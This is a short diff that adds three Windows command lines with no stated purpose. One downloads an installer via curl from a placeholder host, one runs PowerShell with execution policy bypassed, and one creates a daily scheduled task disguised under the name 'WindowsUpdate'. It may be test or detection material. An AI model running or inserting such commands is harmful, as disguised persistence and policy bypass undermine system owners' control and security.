@@ -1,0 +1,3 @@
+cmd /c curl https://packages.example.com/installer.msi
+powershell -ep bypass -c Install-Module AzureAD
+schtasks /create /tn "WindowsUpdate" /tr update.bat /sc daily
